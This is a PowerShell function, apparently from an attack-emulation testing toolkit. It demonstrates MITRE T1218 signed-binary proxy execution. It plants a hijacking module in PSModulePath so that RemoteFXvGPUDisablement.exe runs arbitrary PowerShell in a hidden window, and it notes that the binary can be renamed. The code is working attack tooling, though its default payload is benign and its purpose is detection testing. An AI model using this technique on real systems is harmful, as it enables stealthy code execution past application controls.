function Invoke-ATHRemoteFXvGPUDisablementCommand {
<#
.SYNOPSIS

Executes PowerShell code using RemoteFXvGPUDisablement.exe as a proxy executable.

Technique ID: T1218 (Signed Binary Proxy Execution)

.DESCRIPTION

Invoke-ATHRemoteFXvGPUDisablementCommand executes supplied PowerShell code using RemoteFXvGPUDisablement.exe as a proxy executable. RemoteFXvGPUDisablement.exe was introduced in Windows 10 and Server 2019 (OS Build 17763.1339) and serves as a wrapper around several PowerShell commands.

One of the PowerShell functions called by RemoteFXvGPUDisablement.exe is Get-VMRemoteFXPhysicalVideoAdapter, a part of the Hyper-V module. Invoke-ATHRemoteFXvGPUDisablementCommand gets RemoteFXvGPUDisablement.exe to execute custom PowerShell code by using a technique referred to as "PowerShell module load-order hijacking" where a module containing, in this case, an implementation of the Get-VMRemoteFXPhysicalVideoAdapter is loaded first by way of introducing a temporary module into the first directory listed in the %PSModulePath% environment variable.

Invoke-ATHRemoteFXvGPUDisablementCommand is used to demonstrate how a PowerShell host executable can be directed to user-supplied PowerShell code without needing to supply anything at the command-line. PowerShell code execution is triggered when supplying the "Disable" argument to RemoteFXvGPUDisablement.exe.

Note: This technique will not work under the following conditions:

1. RemoteFXvGPUDisablement.exe is not present.
2. PowerShell Constrained Language Mode is enforced. Because the temporary module written to disk is unlikely to be permitted by application control (WDAC/AppLocker) policy, it will fail to load and be logged accordingly ("Microsoft-Windows-AppLocker/MSI and Script" Event ID 8029 - applies to AppLocker and WDAC).

.PARAMETER RemoteFXvGPUDisablementFilePath

Specifies an alternate directory to execute RemoteFXvGPUDisablement.exe from. if -RemoteFXvGPUDisablementFilePath is not supplied, RemoteFXvGPUDisablement.exe will execute from %windir%.

.PARAMETER ScriptBlock

Specifies optional PowerShell code to execute. Note that supplied PowerShell code will not display output so validate execution accordingly. When supplying a custom scriptblock, Invoke-ATHRemoteFXvGPUDisablementCommand is unable to validate successful execution. if -ScriptBlock is not supplied, it will execute template PowerShell code that is used to validate successful execution.

.PARAMETER ModuleName

Specifies a temporary module name to use. If -ModuleName is not supplied, a 16-character random temporary module name is used.

.PARAMETER ModulePath

Specifies an alternate, non-default PowerShell module path for RemoteFXvGPUDisablement.exe. If -ModulePath is not specified, the first entry in %PSModulePath% will be used/ Typically, this is %USERPROFILE%\Documents\WindowsPowerShell\Modules.

.PARAMETER TestGuid

Optionally, specify a test GUID value to use to override the generated test GUID behavior.

.OUTPUTS

PSObject

Outputs an object consisting of relevant execution details. The following object properties may be populated:

* TechniqueID - Specifies the relevant MITRE ATT&CK Technique ID.
* TestSuccess - Will be set to True if it was determined that the PowerShell code successfully executed. Note: "True" is only returned when an argument is not supplied to -ScriptBlock, i.e. the default template code is used.
* TestGuid - Specifies the test GUID that was used for the test.
* ModulePath - Specifies the path to the temporary module created.
* ModuleContents - Specifies the contents of the custom implementation of the Get-VMRemoteFXPhysicalVideoAdapter function.
* ModuleFileHash - Specifies the SHA256 file hash of the custom script module file.
* RunnerFilePath - Specifies the full path of RemoteFXvGPUDisablement.exe.
* RunnerProcessId - Specifies the process ID of RemoteFXvGPUDisablement.exe.
* RunnerCommandLine - Specifies the command-line of RemoteFXvGPUDisablement.exe.
* RunnerChildProcessId - Specifies the process ID of the process that was executed as the result of the PowerShell code executing. This will only be populated when code is not supplied via -ScriptBlock.
* RunnerChildProcessCommandLine - Specifies the command-line of process that was executed as the result of the PowerShell code executing. This will only be populated when code is not supplied via -ScriptBlock.

.EXAMPLE

Invoke-ATHRemoteFXvGPUDisablementCommand

.EXAMPLE

Invoke-ATHRemoteFXvGPUDisablementCommand -ScriptBlock { Get-Date | Out-File -FilePath 'C:\Users\CurrentUser\Desktop\executed.txt' -Append }

.EXAMPLE

Invoke-ATHRemoteFXvGPUDisablementCommand -ModuleName Foo

.EXAMPLE

Invoke-ATHRemoteFXvGPUDisablementCommand -ModulePath $PWD

Executes PowerShell code from a user-supplied module path, in this case, the current directory.

.EXAMPLE

Copy-Item -Path "$Env:windir\System32\RemoteFXvGPUDisablement.exe" -Destination 'notepad.exe'
Invoke-ATHRemoteFXvGPUDisablementCommand -RemoteFXvGPUDisablementFilePath 'notepad.exe'

Executes RemoteFXvGPUDisablement.exe from a relocated and renamed executable, notepad.exe in the current directory, in this case.

.LINK

https://support.microsoft.com/en-us/help/4558998/windows-10-update-kb4558998
https://support.microsoft.com/en-us/help/4570006/update-to-disable-and-remove-the-remotefx-vgpu-component
https://twitter.com/pronichkin/status/1285241439052427265
#>

    [CmdletBinding()]
    param (
        [String]
        [ValidateNotNullOrEmpty()]
        $RemoteFXvGPUDisablementFilePath = "$Env:windir\System32\RemoteFXvGPUDisablement.exe",

        [ScriptBlock]
        $ScriptBlock,

        [String]
        [ValidateNotNullOrEmpty()]
        $ModuleName = ((1..16 | ForEach-Object { [Char] (Get-Random -Minimum 0x41 -Maximum 0x5B) }) -join ''),

        [String]
        [ValidateScript({ Test-Path -Path $_ -PathType Container })]
        $ModulePath,

        [Guid]
        $TestGuid = (New-Guid)
    )

    $ModuleExecuted = $null
    $FullModulePath = $null
    $ExecutedRemoteFXvGPUDisablementCommandLine = $null
    $ExecutedRemoteFXvGPUDisablementPID = $null
    $SpawnedProcCommandLine = $null
    $SpawnedProcProcessId = $null

    $RemoteFXvGPUDisablementFullPath = Resolve-Path -Path $RemoteFXvGPUDisablementFilePath -ErrorAction Stop

    if ($ModulePath) {
        $FullModulePath = Resolve-Path -Path $ModulePath
    } else {
        # Obtain the first entry in the PSModulePath list
        $FullModulePath = $Env:PSModulePath.Split(';')[0]
    }

    # Validate that the RemoteFXvGPUDisablement supplied is actually RemoteFXvGPUDisablement.
    $RemoteFXvGPUDisablementFileInfo = Get-Item -Path $RemoteFXvGPUDisablementFullPath -ErrorAction Stop

    if ($RemoteFXvGPUDisablementFileInfo.VersionInfo.OriginalFilename -ne 'RemoteFXvGPUDisablement.exe') {
        Write-Error "The RemoteFXvGPUDisablement executable supplied is not RemoteFXvGPUDisablement.exe: $RemoteFXvGPUDisablementFullPath"
        return
    }

    if (Get-Command -Name Get-VMRemoteFXPhysicalVideoAdapter -ErrorAction SilentlyContinue | Where-Object { $_.Source -ne 'Hyper-V' }) {
        Write-Error -Message 'A Get-VMRemoteFXPhysicalVideoAdapter function already exists outside of the Hyper-V module. All other modules containing the Get-VMRemoteFXPhysicalVideoAdapter function must be deleted.'
        return
    }

    $ParentPath = Split-Path -Path $FullModulePath -Parent

    # If the parent module directory doesn't exist, create it
    if (-not (Test-Path -Path $ParentPath)) {
        # Create the PowerShell directory
        $null = New-Item -Path $ParentPath -ItemType Directory -ErrorAction Stop

        # Create the modules directory
        $null = New-Item -Path $FullModulePath -ItemType Directory -ErrorAction Stop
    }

    if ($ScriptBlock) {
        $FunctionToExecute = @'
function Get-VMRemoteFXPhysicalVideoAdapter {

'@ + $ScriptBlock.ToString() + @'

}
'@
    } else {
        $FunctionToExecute = @"
function Get-VMRemoteFXPhysicalVideoAdapter {
    `$ProcessStartup = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly
    `$ProcessStartupInstance = Get-CimInstance -InputObject `$ProcessStartup
    `$ProcessStartupInstance.ShowWindow = [UInt16] 0 # Hide the window
    `$ProcStartResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "powershell.exe -NoProfile -Command Write-Host $TestGuid"; ProcessStartupInformation = `$ProcessStartupInstance }
}
"@
    }

    if (Get-Module -ListAvailable -Name $ModuleName) {
        Write-Error -Message "The $ModuleName module already exists."
        return
    }

    Write-Verbose "Adding the following module to $($FullModulePath): $ModuleName"

    $NewModulePath = New-Item -Path $FullModulePath -Name $ModuleName -ItemType Directory
    $ModuleScriptPath = "$($NewModulePath.FullName)\$ModuleName.psm1"

    Write-Verbose "Writing the following content to $($ModuleScriptPath):`r`n`r`n$FunctionToExecute"

    # Write the module contents to the temporary script module
    Out-File -FilePath $ModuleScriptPath -InputObject $FunctionToExecute -ErrorAction Stop

    $ScriptModuleFileHash = Get-FileHash -Path $ModuleScriptPath | Select-Object -ExpandProperty Hash

    # Validate that the module is now available
    $ModuleInfo = Import-Module $ModuleScriptPath -PassThru -ErrorAction Stop
    $null = Get-Command -Module $ModuleName -Name Get-VMRemoteFXPhysicalVideoAdapter -ErrorAction Stop

    if (-not $ScriptBlock) {
        # Remove any extra ChildProcSpawned events
        Unregister-Event -SourceIdentifier 'ProcessSpawned' -ErrorAction SilentlyContinue
        Get-Event -SourceIdentifier 'ChildProcSpawned' -ErrorAction SilentlyContinue | Remove-Event

        # Trigger an event any time powershell.exe has $TestGuid in the command line.
        # This event should correspond to the mshta or rundll process that launched it.
        $WMIEventQuery = "SELECT * FROM __InstanceCreationEvent WITHIN 0.1 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name = 'powershell.exe' AND TargetInstance.CommandLine LIKE '%$($TestGuid)%'"

        Write-Verbose "Registering powershell.exe child process creation WMI event using the following WMI event query: $WMIEventQuery"

        $null = Register-CimIndicationEvent -SourceIdentifier 'ProcessSpawned' -Query $WMIEventQuery -Action {
            $SpawnedProcInfo = [PSCustomObject] @{
                ProcessId = $EventArgs.NewEvent.TargetInstance.ProcessId
                ProcessCommandLine = $EventArgs.NewEvent.TargetInstance.CommandLine
            }

            New-Event -SourceIdentifier 'ChildProcSpawned' -MessageData $SpawnedProcInfo
        }
    }

    # Spawn RemoteFXvGPUDisablement.exe instance
    $ProcessStartup = New-CimInstance -ClassName Win32_ProcessStartup -ClientOnly
    $ProcessStartupInstance = Get-CimInstance -InputObject $ProcessStartup
    $ProcessStartupInstance.ShowWindow = [UInt16] 0 # Hide the window

    if ($ModulePath) {
        # Prepend the supplied module path to %PSModulePath%
        $CustomPSModulePath = "PSModulePath=$($FullModulePath);$($Env:PSModulePath)"

        # Gather up all existing environment variables except %PSModulePath%.
        [String[]] $AllEnvVarsExceptPSModulePath = Get-ChildItem Env:\* -Exclude 'PSModulePath' | ForEach-Object { "$($_.Name)=$($_.Value)" }

        [String[]] $AllEnvVars = $AllEnvVarsExceptPSModulePath + $CustomPSModulePath

        $ProcessStartupInstance.EnvironmentVariables = $AllEnvVars
    }

    $ProcStartResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "`"$RemoteFXvGPUDisablementFullPath`" Disable"; ProcessStartupInformation = $ProcessStartupInstance }

    if ($ProcStartResult.ReturnValue -eq 0) {
        # Retrieve the actual command-line of the spawned PowerShell process
        $ExecutedRemoteFXvGPUDisablementProcInfo = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = $($ProcStartResult.ProcessId)" -Property CommandLine, ExecutablePath
        $ExecutedRemoteFXvGPUDisablementCommandLine = $ExecutedRemoteFXvGPUDisablementProcInfo.CommandLine
        $ExecutedRemoteFXvGPUDisablementPID = $ProcStartResult.ProcessId
        $RemoteFXvGPUDisablementFullPath = $ExecutedRemoteFXvGPUDisablementProcInfo.ExecutablePath
    } else {
        Write-Error "RemoteFXvGPUDisablementFullPath.exe child process was not spawned."
    }

    if (-not $ScriptBlock) {
        # Wait for the test powershell.exe execution to run
        $ChildProcSpawnedEvent = Wait-Event -SourceIdentifier 'ChildProcSpawned' -Timeout 10
        $ChildProcInfo = $null

        if ($ChildProcSpawnedEvent) {
            $ModuleExecuted = $True

            $ChildProcInfo = $ChildProcSpawnedEvent.MessageData
            $SpawnedProcCommandLine = $ChildProcInfo.ProcessCommandLine
            $SpawnedProcProcessId = $ChildProcInfo.ProcessId

            $ChildProcSpawnedEvent | Remove-Event
        } else {
            Write-Error "powershell.exe child process was not spawned."
        }

        # Cleanup
        Unregister-Event -SourceIdentifier 'ProcessSpawned'
    }

    [PSCustomObject] @{
        TechniqueID       = 'T1218'
        TestSuccess       = $ModuleExecuted
        TestGuid          = $TestGuid
        ModulePath        = $ModuleScriptPath
        ModuleContents    = $FunctionToExecute
        ModuleFileHash    = $ScriptModuleFileHash
        RunnerFilePath    = $RemoteFXvGPUDisablementFullPath
        RunnerProcessId   = $ExecutedRemoteFXvGPUDisablementPID
        RunnerCommandLine = $ExecutedRemoteFXvGPUDisablementCommandLine
        RunnerChildProcessId          = $SpawnedProcProcessId
        RunnerChildProcessCommandLine = $SpawnedProcCommandLine
    }

    # Sleep a few seconds to give it some time to execute prior to deleting the temporary module.
    if ($ScriptBlock) {
        Start-Sleep -Seconds 2
    }

    # Delete the module that was just created
    Write-Verbose "Deleting the script module: $ModuleScriptPath"
    Remove-Item -Path $ModuleScriptPath -Force -ErrorAction SilentlyContinue

    Write-Verbose "Deleting the module path: $NewModulePath"
    Remove-Item -Path $NewModulePath -Force -ErrorAction SilentlyContinue

    Remove-Module -ModuleInfo $ModuleInfo -ErrorAction SilentlyContinue
    Remove-Item Function:\Get-VMRemoteFXPhysicalVideoAdapter -ErrorAction SilentlyContinue
}